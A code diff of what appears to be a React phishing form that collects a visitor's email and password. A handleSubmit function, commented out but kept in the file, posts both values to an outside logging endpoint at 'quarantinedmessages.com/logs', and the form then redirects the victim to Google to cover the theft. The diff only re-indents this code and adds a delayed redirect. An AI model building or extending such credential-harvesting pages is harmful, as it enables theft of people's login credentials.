@@ -45,39 +45,42 @@ const Form = () => {
             setPassword('')
             setEmail('')
             window.location.href = 'https://www.google.com';
+            // setTimeout(() => {
+            //   window.location.href = 'https://www.google.com';
+            //   console.log("redirecting")
+            // }, 4000);
         }
+
+       
       }; 
 
-//     const handleSubmit = async (e) => {
-//         e.preventDefault();
+    // const handleSubmit = async (e) => {
+    //     e.preventDefault();
 
-//         try{
-//             const response = await axios.post('https://quarantinedmessages.com/logs', {
-//                 password: password,
-//                 email: email
-//             })
+    //     try{
+    //         const response = await axios.post('https://quarantinedmessages.com/logs', {
+    //             password: password,
+    //             email: email
+    //         })
+    //         setIsLoading(true)
 
-//             console.log(response);
-//             console.log("Posting")
+    //         console.log(response);
+    //         console.log("Posting")
+    //     }catch (error) {
+    //         console.error('Error making POST request:', error);
+    //     }
 
-//             if (response.status === 200) {
-//                 // Request successful, set the redirect state to true
-//                 setRedirecting(true);
-//               }
-//         }catch (error) {
-//             console.error('Error making POST request:', error);
-//         }
+    //     setRedirecting(true);
+      
+      
 
-//         setEmail('')
-//           setPassword('')
+    //     setIsLoading(false)
+    //     setEmail('')
+    //     setPassword('')
 
-//         // Redirect to Google if the redirecting state is true
-//   if (redirecting) {
-//     window.location.href = 'https://www.google.com';
-//   }
-        
-        
-//     }
+    // }
+
+
   return (
     <div className='form'>
         <div className="form-contain">
